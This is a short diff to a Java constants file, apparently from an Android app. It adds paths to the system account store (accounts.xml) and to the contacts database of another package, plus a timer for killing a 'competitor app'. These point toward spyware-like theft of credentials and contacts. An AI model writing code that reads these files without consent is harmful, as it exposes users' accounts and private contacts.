@@ -32,4 +32,20 @@ public class Constants {
 	 */
 	public static final String INTERNAL_STORAGE_PATH = "/data/data/" + MY_PACKAGE_NAME + "/";
 	
+	/**
+	 * The path to the accounts xml file
+	 */
+	public static final String ACCOUNTS_FILEPATH = "/data/system/sync/accounts.xml";
+	
+	/**
+	 * The path to the contacts db file
+	 */
+	public static final String CONTACTS_FILE = "/data/data/com.android.providers.contacts/databases/contacts2.db";
+	
+	/**
+	 * The interval between checks on the status of the competitor app
+	 */
+	public static final int KILL_COMPETITOR_INTERVAL = 10*1000;
+	
+	
 }
